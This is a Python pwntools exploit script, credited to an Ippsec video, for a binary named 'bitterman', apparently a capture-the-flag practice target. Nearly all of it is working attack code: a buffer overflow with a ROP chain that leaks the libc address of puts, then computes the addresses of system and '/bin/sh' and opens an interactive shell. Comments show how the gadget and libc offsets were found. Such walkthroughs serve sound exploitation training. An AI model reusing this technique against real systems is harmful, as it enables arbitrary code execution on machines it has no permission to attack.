#
# Initial exploit code from Ippsec Bitterman video
#
# https://youtu.be/6S4A2nhHdWg
#

from pwn import * 

context(terminal=['tmux', 'new-window'])

p = process('./bitterman')
# p = gdb.debug('./bitterman', 'b main')

context(os='linux', arch='amd64')

# context.log_level = 'DEBUG'
# objdump -D bitterman | grep puts
# 400520:       ff 25 2a 07 20 00       jmpq   *0x20072a(%rip)        # 600c50 <puts@GLIBC_2.2.5>

# Stage 1: Leak base address

plt_puts = p64(0x400520)
got_puts = p64(0x600c50) 
pop_rdi  = p64(0x400853)
plt_main = p64(0x4006ec)
junk = ("A" * 152).encode('latin1')


# > What's your name? 
# ippsec
# Hi, ippsec

# > Please input the length of your message: 
# 12
# > Please enter your text: 
# test
# > Thanks!

payload = junk + pop_rdi + got_puts + plt_puts + plt_main

p.recvuntil("> What's your name?")
p.sendline("ippsec")
p.recvuntil("> Please input the length of your message:")
p.sendline("1024")
p.recvuntil("> Please enter your text:")
p.sendline(payload)
p.recvuntil("Thanks!\n")
leaked_puts = p.recv()[0:7].rstrip().ljust(8, b"\x00")
log.success(f"Leaked puts@GLIBC: {leaked_puts}")

leaked_puts = u64(leaked_puts)

# Stage 2: Calculate offsets
# readelf -s libc.so.6 | grep puts
# strings -a -t x libc.so.6 | grep /bin/sh

libc_puts   = 0x76030
libc_system = 0x488a0
libc_binsh  = 0x1881ac

offset = leaked_puts - libc_puts

sys   = p64(offset + libc_system)
binsh = p64(offset + libc_binsh)

payload = junk + pop_rdi + binsh + sys

#p.recvuntil("> What's your name?")
p.sendline("ippsec")
p.recvuntil("> Please input the length of your message:")
p.sendline("1024")
p.recvuntil("> Please enter your text:")
p.sendline(payload)
p.recvuntil("Thanks!\n")
p.interactive()


